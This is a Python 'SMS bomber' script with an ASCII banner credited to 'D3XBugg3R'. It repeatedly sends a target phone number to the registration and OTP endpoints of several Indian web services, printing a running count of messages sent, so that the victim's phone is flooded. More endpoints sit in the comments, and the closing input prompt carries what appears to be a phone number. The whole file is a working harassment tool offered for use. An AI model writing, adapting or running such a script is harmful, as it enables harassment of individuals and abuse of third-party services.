from urllib.request import Request,urlopen
from urllib.parse import urlencode,quote_plus
import platform
import os
import time
import urllib
import urllib.request
import http.cookiejar

def banner():
    if platform.system().lower()=="windows":
        os.system("cls")
    else:
        os.system("clear")
    print("""

  /$$$$$$  /$$      /$$  /$$$$$$        /$$$$$$$   /$$$$$$  /$$      /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$ 
 /$$__  $$| $$$    /$$$ /$$__  $$      | $$__  $$ /$$__  $$| $$$    /$$$| $$__  $$| $$_____/| $$__  $$
| $$  \__/| $$$$  /$$$$| $$  \__/      | $$  \ $$| $$  \ $$| $$$$  /$$$$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$ | $$ $$/$$ $$|  $$$$$$       | $$$$$$$ | $$  | $$| $$ $$/$$ $$| $$$$$$$ | $$$$$   | $$$$$$$/
 \____  $$| $$  $$$| $$ \____  $$      | $$__  $$| $$  | $$| $$  $$$| $$| $$__  $$| $$__/   | $$__  $$
 /$$  \ $$| $$\  $ | $$ /$$  \ $$      | $$  \ $$| $$  | $$| $$\  $ | $$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$/| $$ \/  | $$|  $$$$$$/      | $$$$$$$/|  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$$$$$$$| $$  | $$
 \______/ |__/     |__/ \______/       |_______/  \______/ |__/     |__/|_______/ |________/|__/  |__/
                                                                                                                                                                                                    
                                   By : D3XBugg3R  
                                With <3 of T34M GCA                                                                                                  
    Note : I won't be responsible for any damage caused by this script, Use at your own risk
""")
#http://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=

#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=

#http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=

#http://www.quikr.com/SignIn?aj=1&for=send_otp&user=

def send(num, counter, slep):
    url1 = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile="]
    #url="https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile="
    data={"phone":num}
    x=y=0
    for y in range(int(counter)):
        for x in url1:
            banner()
            print("Target Number          : ", num)
            print("Number of Message Sent : ", y+1)
            result_url=str(x)+num
            resp1=Request(result_url)
            urlopen(resp1)
            time.sleep(slep)        

banner()
send(input("89851744470 : "), input("1: "), 1)
